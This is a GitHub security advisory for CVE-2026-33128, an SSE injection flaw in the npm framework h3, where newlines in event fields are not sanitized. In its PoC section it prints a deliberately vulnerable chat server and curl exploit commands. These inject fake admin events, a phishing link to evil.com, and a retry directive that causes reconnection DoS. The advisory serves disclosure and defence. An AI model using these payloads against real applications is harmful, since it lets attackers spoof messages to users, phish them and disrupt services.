# [H] h3 has a Server-Sent Events Injection via Unsanitized Newlines in Event Stream Fields

## Summary
Severity: High
Advisory: GHSA-22cc-p3c6-wpvm
CVE: CVE-2026-33128
CWE: CWE-93
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-22cc-p3c6-wpvm
Type: github-advisory

## Affected
- npm: `h3` — affected >=2.0.0 <2.0.1-rc.15
- npm: `h3` — affected >=0 <1.15.6

## Details
## Summary

`createEventStream` in h3 is vulnerable to Server-Sent Events (SSE) injection due to missing newline sanitization in `formatEventStreamMessage()` and `formatEventStreamComment()`. An attacker who controls any part of an SSE message field (`id`, `event`, `data`, or comment) can inject arbitrary SSE events to connected clients.

## Details

The vulnerability exists in `src/utils/internal/event-stream.ts`, lines [170](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L170)-[187](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L187):

```typescript
export function formatEventStreamComment(comment: string): string {
  return `: ${comment}\n\n`;
}

export function formatEventStreamMessage(message: EventStreamMessage): string {
  let result = "";
  if (message.id) {
    result += `id: ${message.id}\n`;
  }
  if (message.event) {
    result += `event: ${message.event}\n`;
  }
  if (typeof message.retry === "number" && Number.isInteger(message.retry)) {
    result += `retry: ${message.retry}\n`;
  }
  result += `data: ${message.data}\n\n`;
  return result;
}
```

The SSE protocol (defined in the [WHATWG HTML spec](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation)) uses newline characters (`\n`) as field delimiters and double newlines (`\n\n`) as event separators.

None of the fields (`id`, `event`, `data`, comment) are sanitized for newline characters before being interpolated into the SSE wire format. If any field value contains `\n`, the SSE framing is broken, allowing an attacker to:

1. **Inject arbitrary SSE fields** — break out of one field and add `event:`, `data:`, `id:`, or `retry:` directives
2. **Inject entirely new SSE events** — using `\n\n` to terminate the current event and start a new one
3. **Manipulate reconnection behavior** — inject `retry: 1` to force aggressive reconnection (DoS)
4. **Override Last-Event-ID** — inject `id:` to manipulate which events are replayed on reconnection

### Injection via the `event` field

```
Intended wire format:        Actual wire format (with \n injection):

event: message               event: message
data: attacker: hey          event: admin              ← INJECTED
                             data: ALL_USERS_HACKED    ← INJECTED
                             data: attacker: hey
```

The browser's `EventSource` API parses these as two separate events: one `message` event and one `admin` event.

### Injection via the `data` field

```
Intended:                    Actual (with \n\n injection):

event: message               event: message
data: bob: hi                data: bob: hi
                                                        ← event boundary
                             event: system              ← INJECTED event
                             data: Reset: evil.com      ← INJECTED data
```

Before exploit:
<img width="700" height="61" alt="image" src="https://github.com/user-attachments/assets/d9d28296-0d42-40d7-b79c-d337406cbfc9" />

<img width="713" height="228" alt="image" src="https://github.com/user-attachments/assets/5a52debc-2775-4367-b427-df4100fe2b8e" />

## PoC

### Vulnerable server (`sse-server.ts`)

A realistic chat/notification server that broadcasts user input via SSE:

```typescript
import { H3, createEventStream, getQuery } from "h3";
import { serve } from "h3/node";

const app = new H3();
const clients: any[] = [];

app.get("/events", (event) => {
  const stream = createEventStream(event);
  clients.push(stream);
  stream.onClosed(() => {
    clients.splice(clients.indexOf(stream), 1);
    stream.close();
  });
  return stream.send();
});

app.get("/send", async (event) => {
  const query = getQuery(event);
  const user = query.user as string;
  const msg = query.msg as string;
  const type = (query.type as string) || "message";

  for (const client of clients) {
    await client.push({ event: type, data: `${user}: ${msg}` });
  }

  return { status: "sent" };
});

serve({ fetch: app.fetch });
```

### Exploit

```bash
# 1. Inject fake "admin" event via event field
curl -s "http://localhost:3000/send?user=attacker&msg=hey&type=message%0aevent:%20admin%0adata:%20SYSTEM:%20Server%20shutting%20down"

# 2. Inject separate phishing event via data field
curl -s "http://localhost:3000/send?user=bob&msg=hi%0a%0aevent:%20system%0adata:%20Password%20reset:%20http://evil.com/steal&type=message"

# 3. Inject retry directive for reconnection DoS
curl -s "http://localhost:3000/send?user=x&msg=test%0aretry:%201&type=message"
```

### Raw wire format proving injection

```
event: message
event: admin
data: ALL_USERS_COMPROMISED
data: attacker: legit

```

The browser's `EventSource` fires this as an `admin` event with data `ALL_USERS_COMPROMISED` — entirely controlled by the attacker.

Proof:

<img width="856" height="275" alt="image" src="https://github.com/user-attachments/assets/111d3fde-e461-4e44-8112-9f19fff41fec" />

<img width="950" height="156" alt="image" src="https://github.com/user-attachments/assets/ff750f9c-e5d9-4aa4-b48a-20b49747d2ab" />


## Impact

An attacker who can influence any field of an SSE message (common in chat applications, notification systems, live dashboards, AI streaming responses, and collaborative tools) can inject arbitrary SSE events that all connected clients will process as legitimate.

**Attack scenarios:**

- **Cross-user content injection** — inject fake messages in chat applications
- **Phishing** — inject fake system notifications with malicious links
- **Event spoofing** — trigger client-side handlers for privileged event types (e.g., `admin`, `system`)
- **Reconnection DoS** — inject `retry: 1` to force all clients to reconnect every 1ms
- **Last-Event-ID manipulation** — override the event ID to cause event replay or skipping on reconnection

This is a framework-level vulnerability, not a developer misconfiguration — the framework's API accepts arbitrary strings but does not enforce the SSE protocol's invariant that field values must not contain newlines.

## References
- https://github.com/h3js/h3/security/advisories/GHSA-22cc-p3c6-wpvm
- https://nvd.nist.gov/vuln/detail/CVE-2026-33128
- https://github.com/h3js/h3/commit/7791538e15ca22437307c06b78fa155bb73632a6
- https://github.com/h3js/h3
- https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L170-L187
